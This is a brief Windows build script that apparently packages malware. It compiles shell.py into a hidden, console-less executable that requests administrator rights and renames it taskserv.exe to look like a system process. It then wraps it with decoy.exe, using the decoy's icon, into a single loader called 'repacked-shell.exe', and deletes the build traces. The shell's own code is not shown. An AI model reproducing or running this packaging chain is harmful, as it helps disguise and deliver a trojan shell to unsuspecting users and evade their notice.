pyinstaller.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\shell.py
copy dist\shell.exe .\taskserv.exe
pyinstaller.exe --add-binary="taskserv.exe;." --add-binary="decoy.exe;." --icon=decoy.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
rmdir repacked
mkdir repacked
copy .\dist\loader.exe .\repacked\repacked-shell.exe
del installer.exe
rmdir dist /S /Q
rmdir build /S /Q
